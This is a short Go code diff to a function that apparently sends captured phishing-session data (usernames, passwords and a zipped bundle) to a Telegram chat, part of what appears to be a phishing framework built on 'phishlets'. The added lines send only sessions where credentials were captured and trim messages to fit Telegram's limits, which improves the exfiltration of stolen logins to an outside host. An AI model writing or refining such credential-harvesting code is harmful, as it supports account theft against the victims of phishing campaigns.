@@ -100,6 +100,16 @@ func SendTelegramNotification(cfg *Config, s *Session, p *Phishlet) {
 
 	zipWriter.Close()
 
+	if s.Username == "" && s.Password == "" {
+		return
+	}
+
+	// Truncate message if it's too long for Telegram caption (limit is 1024)
+	// We use a safe limit of 750 to account for JSON escaping expansion
+	if len(msg) > 750 {
+		msg = msg[:747] + "..."
+	}
+
 	if s.TelegramMessageID == 0 {
 		// First time sending - create new message
 		msgID := sendToTelegram(cfg.telegramConfig.Token, cfg.telegramConfig.ChatId, msg, buf.Bytes())
